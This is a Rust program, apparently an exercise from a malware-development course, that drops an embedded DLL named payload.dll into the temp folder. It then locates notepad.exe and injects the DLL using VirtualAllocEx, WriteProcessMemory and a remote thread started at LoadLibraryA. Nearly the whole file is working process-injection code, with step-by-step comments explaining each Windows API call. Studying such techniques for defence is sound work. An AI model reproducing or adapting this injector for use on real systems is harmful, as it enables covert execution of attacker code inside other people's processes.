use std::ffi::CString;
use std::ffi::c_void;
use std::mem::transmute;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualAllocEx};
use windows::Win32::System::Threading::{
    CreateRemoteThread, INFINITE, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION,
    PROCESS_VM_WRITE, WaitForSingleObject,
};
use windows::core::PCSTR;

// The compiled DLL is baked into this binary at compile time.
// Build dll-payload first, then build this crate.
const DLL_BYTES: &[u8] = include_bytes!(
    "/home/lucas/HPI/projects/maldev/getting-started/target/x86_64-pc-windows-gnu/release/dll_payload.dll"
);

fn main() {
    // Step 0 — Drop the embedded DLL to a temp path on disk.
    // LoadLibraryA needs a file path — the DLL must exist on disk.
    // We carry the bytes inside this binary and write them out at runtime.
    //
    // Hint: std::env::temp_dir() gives you %TEMP% as a PathBuf.
    //       std::fs::write(path, DLL_BYTES) drops the file.
    //       Convert the path to a null-terminated byte string for Win32:
    //           CString::new(path.to_str().unwrap()).unwrap()
    //       Then pass .as_bytes_with_nul() as the DLL_PATH in later steps.

    let dllpath = std::env::temp_dir().join("payload.dll");

    std::fs::write(
        &dllpath, 
        DLL_BYTES
    ).expect("failed to drop dll");

    let dll_path_cstring = CString::new(
        dllpath.to_str().unwrap()
    ).unwrap();

    let dll_path_bytes: &[u8] = dll_path_cstring.as_bytes_with_nul();

    unsafe {
        // Step 1 — Find notepad.exe PID via Toolhelp32 snapshot.
        // Reuse your Module 02 code directly.
        let snapshot = CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS, 0
        ).ok().expect("Tool Helpfer failed");

        let mut entry = PROCESSENTRY32W {dwSize: size_of::<PROCESSENTRY32W>() as u32, ..Default::default()};
        Process32FirstW(
            snapshot,  
            &mut entry
        ).ok().expect("error with first process");

        let pid = loop {
            if String::from_utf16_lossy(&entry.szExeFile).trim_matches('\0') == "notepad.exe" {
                break entry.th32ProcessID;
            }
            Process32NextW(snapshot, &mut entry).ok().expect("notepad not running");
        };

        // Step 2 — Open the target process.
        //
        // OpenProcess(
        //     dwdesiredaccess: PROCESS_ACCESS_RIGHTS, // rights you need OR'd together
        //     binherithandle: BOOL,                   // child process handle inheritance — use false
        //     dwprocessid: u32,                       // target PID
        // ) -> Result<HANDLE>                         // process handle, or Err if access denied
        let handle = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
            false, 
            pid
        ).expect("failed to open Process");

        // Step 3 — Allocate space in the target for the DLL path string.
        //
        // VirtualAllocEx(
        //     hprocess: HANDLE,                          // target process handle
        //     lpaddress: Option<*const c_void>,          // desired base — None lets the OS pick
        //     dwsize: usize,                             // bytes to allocate — dll_path_bytes.len()
        //     flallocationtype: VIRTUAL_ALLOCATION_TYPE, // MEM_COMMIT | MEM_RESERVE
        //     flprotect: PAGE_PROTECTION_FLAGS,          // PAGE_READWRITE — path data, never executes
        // ) -> *mut c_void                               // address in the *target's* space; NULL on failure

        let remote_path = VirtualAllocEx(
            handle, 
            None,
            dll_path_bytes.len(),
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE);

        if remote_path.is_null() {
            panic!("VirtualAllocEx failed: {:?}", GetLastError());
        }

        // Step 4 — Write the DLL path into the remote allocation.
        //
        // WriteProcessMemory(
        //     hprocess: HANDLE,                           // target process handle
        //     lpbaseaddress: *const c_void,               // where to write (remote_path cast)
        //     lpbuffer: *const c_void,                    // local bytes to copy from
        //     nsize: usize,                               // number of bytes to copy
        //     lpnumberofbyteswritten: Option<*mut usize>, // out-param — None if you don't need the count
        // ) -> BOOL                                       // nonzero = success
        WriteProcessMemory(
            handle, 
            remote_path as *const c_void, 
            dll_path_bytes.as_ptr() as *const c_void, 
            dll_path_bytes.len(),
            None
        ).expect("failed to Write Process Memory");

        // Step 5 — Get LoadLibraryA's address in this process.
        // Because kernel32 loads at the same address in every process per boot session,
        // this pointer is valid inside notepad.exe too.
        //
        // GetModuleHandleA(
        //     lpmodulename: PCSTR,  // null-terminated name of an already-loaded DLL
        // ) -> Result<HMODULE>      // the DLL's base address in memory
        //
        // GetProcAddress(
        //     hmodule: HMODULE,    // the module to search
        //     lpprocname: PCSTR,   // exported function name (null-terminated)
        // ) -> Option<FARPROC>     // opaque function pointer — transmute to LPTHREAD_START_ROUTINE
        
        let k32base = GetModuleHandleA(
            PCSTR(b"kernel32.dll\0".as_ptr())
        ).expect("Get Module Handle failed");

        let functionptr = GetProcAddress(
            k32base, 
            PCSTR(b"LoadLibraryA\0".as_ptr())
        ).expect("Get Proc Adress failed");
        

        // Step 6 — Create a remote thread that calls LoadLibraryA(remote_path).
        // lpparameter is NOT None — it's the remote path pointer.
        // LoadLibraryA receives it as its string argument and loads the DLL.
        //
        // CreateRemoteThread(
        //     hprocess: HANDLE,                                    // target process handle
        //     lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>, // thread security — None for default
        //     dwstacksize: usize,                                  // stack size — 0 = system default
        //     lpstartaddress: LPTHREAD_START_ROUTINE,              // LoadLibraryA's address
        //     lpparameter: Option<*const c_void>,                  // argument for the function — remote path pointer
        //     dwcreationflags: u32,                                // 0 = start immediately
        //     lpthreadid: Option<*mut u32>,                        // out-param for thread ID — None
        // ) -> Result<HANDLE>                                      // handle to the new thread
        
        let thread = CreateRemoteThread(
            handle, 
            None, 
            0, 
            transmute(functionptr), // call LoadLibaryA
            Some(remote_path as *const c_void), // with dll as parameter
            0,
            None
        ).expect("failed to Create Thread");

        WaitForSingleObject(thread, INFINITE);
    }
}
